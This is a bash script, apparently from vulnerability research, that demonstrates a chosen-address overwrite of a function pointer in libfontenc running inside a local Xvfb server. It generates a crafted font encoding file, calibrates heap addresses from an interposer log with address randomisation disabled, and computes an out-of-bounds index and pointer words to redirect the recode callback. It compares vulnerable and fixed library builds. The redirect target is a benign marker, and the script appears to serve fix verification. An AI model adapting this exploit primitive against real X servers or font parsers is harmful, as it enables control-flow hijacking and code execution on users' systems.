#!/bin/bash
# W187: chosen-address overwrite of a live FontMapRec.recode inside a real
# loopback Xvfb.  Phase 1 calibrates the buffer base and benign marker address
# from the interposer log; phase 2 computes the setCode index and four words.
# Fixed and safe-input controls included.
set -u
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
BASE=$(CDPATH= cd -- "$HERE/../.." && pwd)
TMP="$BASE/realpath/tmp/xfptr"
OUT="$BASE/realpath/evidence/xfptr"
FONTS="$TMP/fonts"
VULN="$BASE/build-vuln/out-plain/libfontenc.so.1.0.0"
FIXED="$BASE/build-fixed/out-plain/libfontenc.so.1.0.0"
XLFD='-urw-nimbus mono ps-regular-r-normal--0-0-0-0-p-0-crafted-1'
mkdir -p "$FONTS" "$OUT"
cc -shared -fPIC -O0 -g -I"$BASE/src" -o "$TMP/interpose.so" "$HERE/interpose.c" -ldl

# $1 rows; $2..$5 from values; $6..$9 hex words (without 0x)
write_enc() {
cat > "$FONTS/crafted-1.enc" <<EOF
STARTENCODING crafted-1
SIZE 256 $1
STARTMAPPING cmap 3 1
0x0000 0x0001
ENDMAPPING
STARTMAPPING cmap 3 1
0xff00 0x1111
ENDMAPPING
STARTMAPPING unicode
0xff00 0xdead
ENDMAPPING
STARTMAPPING unicode
$2 0x$6
ENDMAPPING
STARTMAPPING unicode
$3 0x$7
ENDMAPPING
STARTMAPPING unicode
$4 0x$8
ENDMAPPING
STARTMAPPING unicode
$5 0x$9
ENDMAPPING
ENDENCODING
EOF
}

prep_fonts() {
    cp "$HERE/type1fonts/NimbusMonoPS-Regular.pfb" "$HERE/type1fonts/fonts.dir" \
       "$HERE/type1fonts/encodings.dir" "$FONTS/"
}
start_xvfb() { # lib disp
    MALLOC_MMAP_THRESHOLD_=262144 LD_PRELOAD="$TMP/interpose.so:$1" \
      setarch x86_64 -R Xvfb ":$2" -screen 0 640x480x24 -nolisten tcp \
      -noreset -fp "$FONTS" > "$TMP/$2.xvfb.log" 2>&1 &
    echo $!
}
load_font() { DISPLAY=":$1" "$HERE/xfon-load" ":$1" "$XLFD" > "$TMP/$1.client" 2>&1 || true; sleep 1; }
stop_xvfb() { kill "$1" 2>/dev/null || true; wait "$1" 2>/dev/null || true; }
hex() { echo "$((16#${1#0x}))"; }

# Phase 1: in-bounds input, read buffer base, m3 address and marker address.
prep_fonts
write_enc 256 0xfe24 0xfe25 0xfe26 0xfe27 9159 f7fb 7fff 0000
pid=$(start_xvfb "$VULN" 1520); sleep 3; load_font 1520; stop_xvfb "$pid"
cal="$TMP/cal.txt"
grep -E 'LF_MARKER_ADDR|LF_BUF|LF_FIND_MAP n=3' "$TMP/1520.xvfb.log" > "$cal"
buf=$(grep 'LF_BUF' "$cal" | head -1 | sed -E 's/.*=//')
m3=$(grep 'LF_FIND_MAP n=3' "$cal" | tail -1 | sed -E 's/.*m=([^ ]*).*/\1/')
marker=$(grep 'LF_MARKER_ADDR' "$cal" | tail -1 | sed -E 's/.*=//')
if [ -z "$buf" ] || [ -z "$m3" ] || [ -z "$marker" ]; then echo 'CALIBRATION FAILED'; exit 2; fi
idx=$(( ( $(hex "$m3") + 0x10 - $(hex "$buf") ) / 2 ))
base=$(( (idx / 258) * 256 + idx % 258 ))
wm=$(hex "$marker")
set -- $(printf '0x%x ' $((base)) $((base+1)) $((base+2)) $((base+3))) \
       $(printf '%04x %04x %04x %04x' $((wm & 0xffff)) $(((wm >> 16) & 0xffff)) \
         $(((wm >> 32) & 0xffff)) $(((wm >> 48) & 0xffff)))
F0=$1; F1=$2; F2=$3; F3=$4; W0=$5; W1=$6; W2=$7; W3=$8
printf 'buffer=%s m3=%s marker=%s idx=%s from=%s %s %s %s words=%s %s %s %s\n' \
    "$buf" "$m3" "$marker" "$idx" "$F0" "$F1" "$F2" "$F3" "$W0" "$W1" "$W2" "$W3" \
    | tee "$OUT/matrix.txt"

# Phase 2: crafted (vulnerable twice, fixed) and safe-input controls.
run_case() { # tag lib rows disp
    tag=$1; lib=$2; rows=$3; disp=$4
    [ -f "$lib" ] || { echo "MISSING LIB $lib" >&2; exit 2; }
    prep_fonts
    write_enc "$rows" "$F0" "$F1" "$F2" "$F3" "$W0" "$W1" "$W2" "$W3"
    pid=$(start_xvfb "$lib" "$disp"); sleep 3; load_font "$disp"; stop_xvfb "$pid"
    log="$TMP/$disp.xvfb.log"
    {
        echo "# $tag — filtered distinctive lines from raw Xvfb stderr"
        echo "# recode_call_count=$(grep -c LF_RECODE_MAP "$log")"
        echo "# marker_call_count=$(grep -c LF_XVFB_MARKER "$log")"
        grep -E 'LF_MARKER_ADDR|LF_BUF|LF_FIND charset|LF_FIND_MAP|LF_RECODE_MAP' "$log" | sort -u
        grep -iE 'error|fatal|abort|segfault' "$log" | sort -u | head -5
    } > "$OUT/$tag.xvfb.txt"
    m3r=$(grep 'LF_FIND_MAP n=3' "$log" | tail -1 | sed -E 's/.*recode=//')
    rc=$(grep 'LF_RECODE_MAP' "$log" | sed -E 's/.*=//' | sort -u | tr '\n' ',')
    printf '%s marker_calls=%s m3_recode=%s recode_targets=%s\n' \
        "$tag" "$(grep -c LF_XVFB_MARKER "$log" || true)" "$m3r" "$rc" | tee -a "$OUT/matrix.txt"
}
run_case vuln-crafted-a "$VULN" 258 1521
run_case vuln-crafted-b "$VULN" 258 1522
run_case vuln-safe "$VULN" 256 1523
run_case fixed-crafted "$FIXED" 258 1524
